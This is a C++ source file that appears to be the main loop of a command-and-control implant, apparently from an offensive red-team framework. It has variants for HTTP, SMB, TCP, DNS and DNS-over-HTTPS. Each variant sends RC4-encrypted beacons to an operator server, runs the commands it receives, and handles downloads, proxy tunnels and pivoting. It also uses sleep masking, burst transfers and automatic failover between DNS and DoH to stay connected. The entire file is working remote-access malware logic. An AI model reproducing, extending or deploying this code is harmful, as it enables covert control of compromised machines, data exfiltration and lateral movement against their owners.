#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "WaitMask.h"

#if defined(BEACON_DNS)
#include "DnsCompression.h"
#endif

Agent* g_Agent;

#if defined(BEACON_HTTP) 

#include "ConnectorHTTP.h"
ConnectorHTTP* g_Connector;

void AgentMain()
{
	if ( !ApiLoad() ) 
		return;

	g_Agent  = (Agent*) MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	g_Connector = (ConnectorHTTP*) MemAllocLocal(sizeof(ConnectorHTTP));
	*g_Connector = ConnectorHTTP();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	if ( !g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize) )
		return;

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	do {
		if (packerOut->datasize() > 4) {
			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			
			packerOut->Clear(TRUE);
			packerOut->Pack32(0);
		}
		else {
			g_Connector->SendData(NULL, 0);
		}

		if ( g_Connector->RecvSize() && g_Connector->RecvData()) {
			DecryptRC4( g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16 );

			// Protocol Validation: Check if the Little-Endian length header matches the actual buffer size
			BOOL isValid = FALSE;
			ULONG recvSize = g_Connector->RecvSize();
			BYTE* recvData = g_Connector->RecvData();

			if (recvSize >= 8) {
				// Server sends length as Little Endian (see pl_agent.go: PackTasks)
				ULONG packLen = recvData[0] | (recvData[1] << 8) | (recvData[2] << 16) | (recvData[3] << 24);
				
				// The server sends [LE_Len_4_Bytes][Payload...]. 
				// Treat packet as valid only if declared payload length does not exceed actual buffer.
				if (packLen > 0 && packLen <= (recvSize - 4)) {
					isValid = TRUE;
				}
			}

			if (isValid) {
				g_Connector->ReportProtocolResult(TRUE);
				g_Agent->commander->ProcessCommandTasks( recvData, recvSize, packerOut );
			} else {
				// Decryption resulted in garbage (likely a WAF page), trigger rotation
				g_Connector->ReportProtocolResult(FALSE);
			}
		}
		g_Connector->RecvClear();


		if (g_Agent->IsActive() && packerOut->datasize() < 8 )
			WaitMask(g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay );

		g_Agent->downloader->ProcessDownloader(packerOut);			
		g_Agent->jober->ProcessJobs(packerOut);
		g_Agent->proxyfire->ProcessTunnels(packerOut);
		g_Agent->pivotter->ProcessPivots(packerOut);

	} while ( g_Agent->IsActive() );

	g_Agent->commander->Exit(packerOut);

	packerOut->Set32(0, packerOut->datasize());

	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

	g_Connector->SendData(packerOut->data(), packerOut->datasize());
	packerOut->Clear(TRUE);
	g_Connector->RecvClear();

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}



#elif defined(BEACON_SMB) 

#include "ConnectorSMB.h"
ConnectorSMB* g_Connector;

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	g_Connector = (ConnectorSMB*)MemAllocLocal(sizeof(ConnectorSMB));
	*g_Connector = ConnectorSMB();

	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
		return;

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	do {
		g_Connector->Listen();

		g_Connector->SendData(beat, beatSize);

		while ( g_Connector->RecvSize() >= 0 && g_Agent->IsActive() ) {

    		if (g_Connector->RecvSize() > 0 && g_Connector->RecvData()) {
				DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
				g_Connector->RecvClear();
			}

			g_Agent->downloader->ProcessDownloader(packerOut);
			g_Agent->jober->ProcessJobs(packerOut);
			g_Agent->proxyfire->ProcessTunnels(packerOut);
			g_Agent->pivotter->ProcessPivots(packerOut);

			if (packerOut->datasize() > 4) {
				packerOut->Set32(0, packerOut->datasize());

				EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

				g_Connector->SendData(packerOut->data(), packerOut->datasize());

				packerOut->Clear(TRUE);
				packerOut->Pack32(0);
			}
			else {
				g_Connector->SendData(NULL, 0);
			}

			if (g_Connector->RecvSize() == 0 && TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
				TEB->LastErrorValue = 0;
				break;
			}
		}

		if (!g_Agent->IsActive()) {
			g_Agent->commander->Exit(packerOut);

			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			packerOut->Clear(TRUE);
		}

		g_Connector->Disconnect();

	} while (g_Agent->IsActive());

	MemFreeLocal((LPVOID*)&beat, beatSize);

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}



#elif defined(BEACON_TCP)

#include "ConnectorTCP.h"
ConnectorTCP* g_Connector;

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	g_Connector = (ConnectorTCP*)MemAllocLocal(sizeof(ConnectorTCP));
	*g_Connector = ConnectorTCP();

	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
		return;

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	do {
		g_Connector->Listen();

		g_Connector->SendData(beat, beatSize);

		while (g_Connector->RecvSize() >= 0 && g_Agent->IsActive()) {

			if (g_Connector->RecvSize() > 0 && g_Connector->RecvData()) {
				DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
				g_Connector->RecvClear();
			}

			g_Agent->downloader->ProcessDownloader(packerOut);
			g_Agent->jober->ProcessJobs(packerOut);
			g_Agent->proxyfire->ProcessTunnels(packerOut);
			g_Agent->pivotter->ProcessPivots(packerOut);

			if (packerOut->datasize() > 4) {
				packerOut->Set32(0, packerOut->datasize());

				EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

				g_Connector->SendData(packerOut->data(), packerOut->datasize());

				packerOut->Clear(TRUE);
				packerOut->Pack32(0);
			}
			else {
				g_Connector->SendData(NULL, 0);
			}
		}

		if (!g_Agent->IsActive()) {
			g_Agent->commander->Exit(packerOut);

			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			packerOut->Clear(TRUE);
		}

		g_Connector->Disconnect();

	} while (g_Agent->IsActive());

	MemFreeLocal((LPVOID*)&beat, beatSize);

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}


#elif defined(BEACON_DNS)

#include "ConnectorDNS.h"
ConnectorDNS* g_Connector;

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	g_Connector = (ConnectorDNS*)MemAllocLocal(sizeof(ConnectorDNS));
	*g_Connector = ConnectorDNS();
		
	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);
		
	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize))
		return;

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	do {
		if (packerOut->datasize() > 4) {
			// 先写入原始长度头
			packerOut->Set32(0, packerOut->datasize());
		
			BYTE* plainBuf = packerOut->data();
			ULONG plainLen = packerOut->datasize();
		
			// 会话层封装：[flags][orig_len_le][payload]，其中 payload 为完整 packer 缓冲，
			// 包含原有的 4 字节长度头，以保持与 HTTP/TCP 等通道一致的上行格式。
			BYTE* sessionBuf = NULL;
			ULONG sessionLen = 0;
		
			BYTE* payload    = plainBuf;
			ULONG payloadLen = plainLen;
			BYTE  flags      = 0;
		
			// 针对较大的上行数据尝试使用 DEFLATE 压缩，减小 DNS PUT 分片数量。
			const ULONG minCompressSize = 2048;
			if (payloadLen > minCompressSize) {
				BYTE* compBuf = NULL;
				ULONG compLen = 0;
				if (DeflateCompress(payload, payloadLen, &compBuf, &compLen) && compBuf && compLen > 0 && compLen < payloadLen) {
					payload    = compBuf;
					payloadLen = compLen;
					flags      = 1;
				}
			}
		
			sessionLen = 1 + 4 + payloadLen;
			sessionBuf = (BYTE*)MemAllocLocal(sessionLen);
			if (sessionBuf) {
				sessionBuf[0] = flags;
				sessionBuf[1] = (BYTE)(plainLen & 0xFF);
				sessionBuf[2] = (BYTE)((plainLen >> 8) & 0xFF);
				sessionBuf[3] = (BYTE)((plainLen >> 16) & 0xFF);
				sessionBuf[4] = (BYTE)((plainLen >> 24) & 0xFF);
				memcpy(sessionBuf + 5, payload, payloadLen);
			}
		
			if (!sessionBuf) {
				// 内存分配失败，退回原逻辑
				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
				g_Connector->SendData(plainBuf, plainLen);
			} else {
				// RC4 加密封装后的会话缓冲
				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
				g_Connector->SendData(sessionBuf, sessionLen);
				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
			}
		
			// 如果上面使用了压缩，payload 指向的临时缓冲应当在发送后释放。
			if (flags & 0x1 && payload && payload != plainBuf) {
				MemFreeLocal((LPVOID*)&payload, payloadLen);
			}
		
			packerOut->Clear(TRUE);
			packerOut->Pack32(0);
		} else {
			g_Connector->SendData(NULL, 0);
		}

		if (g_Connector->RecvSize() && g_Connector->RecvData()) {
			DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
			BOOL isValid = FALSE;
			ULONG recvSize = (ULONG)g_Connector->RecvSize();
			BYTE* recvData = g_Connector->RecvData();
			if (recvData && recvSize >= 8) {
				ULONG packLen = recvData[0] | (recvData[1] << 8) | (recvData[2] << 16) | (recvData[3] << 24);
				if (packLen > 0 && packLen <= (recvSize - 4)) {
					isValid = TRUE;
				}
			}
			if (isValid) {
				g_Agent->commander->ProcessCommandTasks(recvData, (int)recvSize, packerOut);
			}
		}
		g_Connector->RecvClear();

			// 自适应 sleep：大流量时在 0~0.5 倍基础 sleep 区间内随机等待，任务结束后恢复原始 sleep/jitter。
			if (g_Agent->IsActive() && packerOut->datasize() < 8) {
			ULONG baseSleep = g_Agent->config->sleep_delay;
			ULONG jitter    = g_Agent->config->jitter_delay;

			BOOL burst = FALSE;
			// 阈值 1KB 或 Connector 正忙于重组分片：进入加速模式
			// IsBusy() 确保了即使是小于 1KB 但被切分的小下行任务，也能连续快速拉取，而不需要等待长 Sleep。
			if (g_Connector->IsBusy() || (g_Connector->GetLastUpTotal() >= (1 * 1024)) || (g_Connector->GetLastDownTotal() >= (1 * 1024))) {
				burst = TRUE;
			}

			if (burst) {
				// 加速模式：强制将 sleep 限制在 50ms 以内，以实现连续快速传输（约 10-15 QPS）。
				// 这既能显著加快 BOF/大文件传输速度，又通过 50ms 间隔保持在公共 DNS 的安全限流阈值内。
				ULONG burstSleep = 20;
				if (baseSleep < burstSleep)
					burstSleep = baseSleep;
				
				WaitMask(g_Agent->GetWorkingSleep(), burstSleep, 0); // jitter 设为 0 以保持稳定速率
				
				// 用完一轮后清零统计，后续再根据新一轮大任务重新进入 burst
				g_Connector->ResetTrafficTotals();
			} else {
				// 正常情况下沿用原始 sleep/jitter
				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
			}
		}

		g_Agent->downloader->ProcessDownloader(packerOut);
		g_Agent->jober->ProcessJobs(packerOut);
		g_Agent->proxyfire->ProcessTunnels(packerOut);
		g_Agent->pivotter->ProcessPivots(packerOut);

	} while (g_Agent->IsActive());

	g_Agent->commander->Exit(packerOut);

	packerOut->Set32(0, packerOut->datasize());

	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

	g_Connector->SendData(packerOut->data(), packerOut->datasize());
	packerOut->Clear(TRUE);
	g_Connector->RecvClear();

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}


#elif defined(BEACON_DOH)

#include "ConnectorDoH.h"
#include "DnsCompression.h"
ConnectorDoH* g_Connector;

// Append a log line to ax_doh_beacon.log in the current executable directory.
static void DohDebugLog(const char* msg)
{
	if (!msg) return;

	CHAR path[MAX_PATH] = {0};
	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
	if (len == 0 || len >= MAX_PATH)
		return;

	// Strip filename to get directory
	for (int i = (int)len - 1; i >= 0; --i) {
		if (path[i] == '\\' || path[i] == '/') {
			path[i + 1] = '\0';
			break;
		}
	}
	// Append log filename
	const CHAR logName[] = "ax_doh_beacon.log";
	SIZE_T dirLen = lstrlenA(path);
	if (dirLen + sizeof(logName) >= MAX_PATH)
		return;
	lstrcatA(path, logName);

	HANDLE hFile = CreateFileA(path,
		FILE_APPEND_DATA,
		FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return;

	DWORD written = 0;
	SIZE_T mlen = lstrlenA(msg);
	if (mlen)
		WriteFile(hFile, msg, (DWORD)mlen, &written, NULL);
	CHAR crlf[] = "\r\n";
	WriteFile(hFile, crlf, 2, &written, NULL);
	CloseHandle(hFile);
}

void AgentMain()
{
	DohDebugLog("[DoH] AgentMain start");
	if (!ApiLoad()) {
		DohDebugLog("[DoH] ApiLoad FAIL");
		return;
	}
	DohDebugLog("[DoH] ApiLoad OK");
	DohDebugLog("[DoH] Before Agent allocation");

	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();
	DohDebugLog("[DoH] Agent constructed");

	DohDebugLog("[DoH] Before Connector allocation");
	g_Connector = (ConnectorDoH*)MemAllocLocal(sizeof(ConnectorDoH));
	if (!g_Connector) {
		DohDebugLog("[DoH] MemAllocLocal for ConnectorDoH failed");
		return;
	}
	DohDebugLog("[DoH] Connector memory allocated, calling ctor");
	*g_Connector = ConnectorDoH();
	DohDebugLog("[DoH] ConnectorDoH ctor finished");
		
	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);
	DohDebugLog("[DoH] BuildBeat completed");
		
	DohDebugLog("[DoH] Calling SetConfig");
	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize)) {
		DohDebugLog("[DoH] SetConfig FAIL");
		return;
	}
	DohDebugLog("[DoH] SetConfig OK, entering main loop");

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	do {
		if (packerOut->datasize() > 4) {
			packerOut->Set32(0, packerOut->datasize());
			BYTE* plainBuf = packerOut->data();
			ULONG plainLen = packerOut->datasize();
		
			BYTE* sessionBuf = NULL;
			ULONG sessionLen = 0;
		
			BYTE* payload    = plainBuf;
			ULONG payloadLen = plainLen;
			BYTE  flags      = 0;
		
			const ULONG minCompressSize = 2048;
			if (payloadLen > minCompressSize) {
				BYTE* compBuf = NULL;
				ULONG compLen = 0;
				if (DeflateCompress(payload, payloadLen, &compBuf, &compLen) && compBuf && compLen > 0 && compLen < payloadLen) {
					payload    = compBuf;
					payloadLen = compLen;
					flags      = 1;
				}
			}
		
			sessionLen = 1 + 4 + payloadLen;
			sessionBuf = (BYTE*)MemAllocLocal(sessionLen);
			if (sessionBuf) {
				sessionBuf[0] = flags;
				sessionBuf[1] = (BYTE)(plainLen & 0xFF);
				sessionBuf[2] = (BYTE)((plainLen >> 8) & 0xFF);
				sessionBuf[3] = (BYTE)((plainLen >> 16) & 0xFF);
				sessionBuf[4] = (BYTE)((plainLen >> 24) & 0xFF);
				memcpy(sessionBuf + 5, payload, payloadLen);
			}
		
			if (!sessionBuf) {
				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
				g_Connector->SendData(plainBuf, plainLen);
			} else {
				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
				g_Connector->SendData(sessionBuf, sessionLen);
				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
			}
		
			if (flags & 0x1 && payload && payload != plainBuf) {
				MemFreeLocal((LPVOID*)&payload, payloadLen);
			}
		
			packerOut->Clear(TRUE);
			packerOut->Pack32(0);
		} else {
			g_Connector->SendData(NULL, 0);
		}

		if (g_Connector->RecvSize() && g_Connector->RecvData()) {
			DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
			g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
		}
		g_Connector->RecvClear();

		if (g_Agent->IsActive() && packerOut->datasize() < 8) {
			ULONG baseSleep = g_Agent->config->sleep_delay;
			ULONG jitter    = g_Agent->config->jitter_delay;

			BOOL burst = FALSE;
			if (g_Connector->IsBusy() || (g_Connector->GetLastUpTotal() >= (1 * 1024)) || (g_Connector->GetLastDownTotal() >= (1 * 1024))) {
				burst = TRUE;
			}

			if (burst) {
				DohDebugLog("[DoH] Sleep: burst mode");
				ULONG burstSleep = 50;
				if (baseSleep < burstSleep)
					burstSleep = baseSleep;
				WaitMask(g_Agent->GetWorkingSleep(), burstSleep, 0);
				g_Connector->ResetTrafficTotals();
			} else {
				DohDebugLog("[DoH] Sleep: normal mode");
				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
			}
		}

		g_Agent->downloader->ProcessDownloader(packerOut);
		g_Agent->jober->ProcessJobs(packerOut);
		g_Agent->proxyfire->ProcessTunnels(packerOut);
		g_Agent->pivotter->ProcessPivots(packerOut);

	} while (g_Agent->IsActive());

	g_Agent->commander->Exit(packerOut);

	packerOut->Set32(0, packerOut->datasize());

	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

	g_Connector->SendData(packerOut->data(), packerOut->datasize());
	packerOut->Clear(TRUE);
	g_Connector->RecvClear();

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}

#elif defined(BEACON_DNS_DOH)

#include "ConnectorDNS.h"
#include "ConnectorDoH.h"
#include "DnsCompression.h"

ConnectorDNS* g_DnsConnector;
ConnectorDoH* g_DohConnector;

// Helper macros to dispatch operations to the currently selected transport.
#define TX_SEND(data, size)           (useDns ? g_DnsConnector->SendData((data), (size))      : g_DohConnector->SendData((data), (size)))
#define TX_SIZE()                     (useDns ? g_DnsConnector->RecvSize()                   : g_DohConnector->RecvSize())
#define TX_DATA()                     (useDns ? g_DnsConnector->RecvData()                   : g_DohConnector->RecvData())
#define TX_CLEAR()                    (useDns ? g_DnsConnector->RecvClear()                  : g_DohConnector->RecvClear())
#define TX_IS_BUSY()                  (useDns ? g_DnsConnector->IsBusy()                     : g_DohConnector->IsBusy())
#define TX_LAST_UP()                  (useDns ? g_DnsConnector->GetLastUpTotal()             : g_DohConnector->GetLastUpTotal())
#define TX_LAST_DOWN()                (useDns ? g_DnsConnector->GetLastDownTotal()           : g_DohConnector->GetLastDownTotal())
#define TX_RESET_TOTALS()             (useDns ? g_DnsConnector->ResetTrafficTotals()         : g_DohConnector->ResetTrafficTotals())
#define TX_LAST_OK()                  (useDns ? g_DnsConnector->WasLastQueryOk()             : g_DohConnector->WasLastQueryOk())

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	// Allocate both DNS and DoH connectors.
	g_DnsConnector = (ConnectorDNS*)MemAllocLocal(sizeof(ConnectorDNS));
	if (!g_DnsConnector)
		return;
	*g_DnsConnector = ConnectorDNS();

	g_DohConnector = (ConnectorDoH*)MemAllocLocal(sizeof(ConnectorDoH));
	if (!g_DohConnector)
		return;
	*g_DohConnector = ConnectorDoH();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	// Combined profile carries both DNS and DoH settings.
	// For now we initialize both; transport selection is done per-loop via useDns.
	if (!g_DnsConnector->SetConfig(g_Agent->config->profile.dns, beat, beatSize))
		return;
	if (!g_DohConnector->SetConfig(g_Agent->config->profile.doh, beat, beatSize))
		return;

	// Decide initial transport: default DNS, "doh" forces DoH, "auto" starts on DNS
	// and may fail over to DoH and back to DNS based on connectivity.
	BOOL useDns = TRUE;
	BOOL autoMode = FALSE;
	ULONG dnsFailCount = 0;
	ULONG dohFailCount = 0;
	const ULONG kFailThreshold = 3;  // consecutive failures to trigger switch

	BYTE* mode = g_Agent->config->profile.mode;
	if (mode) {
		if (lstrcmpiA((CHAR*)mode, "doh") == 0) {
			useDns = FALSE;
		} else if (lstrcmpiA((CHAR*)mode, "dns") == 0) {
			useDns = TRUE;
		} else if (lstrcmpiA((CHAR*)mode, "auto") == 0) {
			useDns = TRUE;
			autoMode = TRUE;
		}
	}

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	do {
		if (packerOut->datasize() > 4) {
			packerOut->Set32(0, packerOut->datasize());
			BYTE* plainBuf = packerOut->data();
			ULONG plainLen = packerOut->datasize();

			BYTE* sessionBuf = NULL;
			ULONG sessionLen = 0;

			BYTE* payload    = plainBuf;
			ULONG payloadLen = plainLen;
			BYTE  flags      = 0;

			const ULONG minCompressSize = 2048;
			if (payloadLen > minCompressSize) {
				BYTE* compBuf = NULL;
				ULONG compLen = 0;
				if (DeflateCompress(payload, payloadLen, &compBuf, &compLen) && compBuf && compLen > 0 && compLen < payloadLen) {
					payload    = compBuf;
					payloadLen = compLen;
					flags      = 1;
				}
			}

			sessionLen = 1 + 4 + payloadLen;
			sessionBuf = (BYTE*)MemAllocLocal(sessionLen);
			if (sessionBuf) {
				sessionBuf[0] = flags;
				sessionBuf[1] = (BYTE)(plainLen & 0xFF);
				sessionBuf[2] = (BYTE)((plainLen >> 8) & 0xFF);
				sessionBuf[3] = (BYTE)((plainLen >> 16) & 0xFF);
				sessionBuf[4] = (BYTE)((plainLen >> 24) & 0xFF);
				memcpy(sessionBuf + 5, payload, payloadLen);
			}

			if (!sessionBuf) {
				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
				TX_SEND(plainBuf, plainLen);
			} else {
				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
				TX_SEND(sessionBuf, sessionLen);
				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
			}

			if (flags & 0x1 && payload && payload != plainBuf) {
				MemFreeLocal((LPVOID*)&payload, payloadLen);
			}

			packerOut->Clear(TRUE);
			packerOut->Pack32(0);
		} else {
			TX_SEND(NULL, 0);
		}

		if (TX_SIZE() && TX_DATA()) {
			DecryptRC4(TX_DATA(), TX_SIZE(), g_Agent->SessionKey, 16);
			g_Agent->commander->ProcessCommandTasks(TX_DATA(), TX_SIZE(), packerOut);
		}
		TX_CLEAR();

		{
			BYTE* dnsResolvers = g_Agent->config->profile.dns.resolvers;
			if (dnsResolvers && dnsResolvers != (BYTE*)g_DnsConnector->GetResolvers()) {
				g_DnsConnector->UpdateResolvers(dnsResolvers);
			}
			BYTE* dohUrls = g_Agent->config->profile.doh.urls;
			if (dohUrls && dohUrls != (BYTE*)g_DohConnector->GetUrls()) {
				g_DohConnector->UpdateUrls(dohUrls);
			}
		}

		// Apply any runtime "transport mode" changes coming from COMMAND_TRANSPORT.
		// This keeps useDns/autoMode in sync with config->profile.mode, while still
		// allowing the auto-failover state machine to operate when mode=auto.
		BYTE* dynMode = g_Agent->config->profile.mode;
		if (dynMode) {
			if (lstrcmpiA((CHAR*)dynMode, "doh") == 0) {
				useDns = FALSE;
				autoMode = FALSE;
				dnsFailCount = 0;
				dohFailCount = 0;
			} else if (lstrcmpiA((CHAR*)dynMode, "dns") == 0) {
				useDns = TRUE;
				autoMode = FALSE;
				dnsFailCount = 0;
				dohFailCount = 0;
			} else if (lstrcmpiA((CHAR*)dynMode, "auto") == 0) {
				// Keep current transport when switching to auto mode
				autoMode = TRUE;
				// Don't reset counters - continue monitoring
			}
		}

		// Bi-directional auto-failover in "auto" mode:
		// - DNS fails kFailThreshold times consecutively -> switch to DoH
		// - DoH fails kFailThreshold times consecutively -> switch back to DNS
		// This prevents agent from being stuck if one transport becomes unavailable.
		if (autoMode) {
			if (TX_LAST_OK()) {
				// Success resets the current transport's failure counter
				if (useDns) {
					dnsFailCount = 0;
				} else {
					dohFailCount = 0;
				}
			} else {
				// Failure increments the current transport's counter
				if (useDns) {
					++dnsFailCount;
					if (dnsFailCount >= kFailThreshold) {
						useDns = FALSE;  // switch to DoH
						dnsFailCount = 0;
						dohFailCount = 0;  // give DoH a fresh start
					}
				} else {
					++dohFailCount;
					if (dohFailCount >= kFailThreshold) {
						useDns = TRUE;   // switch back to DNS
						dohFailCount = 0;
						dnsFailCount = 0;  // give DNS a fresh start
					}
				}
			}
		}

		if (g_Agent->IsActive() && packerOut->datasize() < 8) {
			ULONG baseSleep = g_Agent->config->sleep_delay;
			ULONG jitter    = g_Agent->config->jitter_delay;

			BOOL isBusy = TX_IS_BUSY();
			ULONG lastUp = TX_LAST_UP();
			ULONG lastDown = TX_LAST_DOWN();

			BOOL burst = FALSE;
			if (isBusy || (lastUp >= (1 * 1024)) || (lastDown >= (1 * 1024))) {
				burst = TRUE;
			}

			if (burst) {
				// Burst mode: 20ms sleep for fast transfers (~50 QPS theoretical)
				ULONG burstSleep = 20;
				if (baseSleep < burstSleep)
					burstSleep = baseSleep;
				WaitMask(g_Agent->GetWorkingSleep(), burstSleep, 0);
				TX_RESET_TOTALS();
			} else {
				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
			}
		}

		g_Agent->downloader->ProcessDownloader(packerOut);
		g_Agent->jober->ProcessJobs(packerOut);
		g_Agent->proxyfire->ProcessTunnels(packerOut);
		g_Agent->pivotter->ProcessPivots(packerOut);

	} while (g_Agent->IsActive());

	g_Agent->commander->Exit(packerOut);
	packerOut->Set32(0, packerOut->datasize());
	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
	TX_SEND(packerOut->data(), packerOut->datasize());
	packerOut->Clear(TRUE);
	TX_CLEAR();

	// Close both connectors explicitly.
	if (g_DnsConnector)
		g_DnsConnector->CloseConnector();
	if (g_DohConnector)
		g_DohConnector->CloseConnector();

	AgentClear(g_Agent->config->exit_method);
}

#endif

void AgentClear(int method)
{
	if (method == 1)
		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
	else if (method == 2)
		ApiNt->RtlExitUserProcess(STATUS_SUCCESS);
}
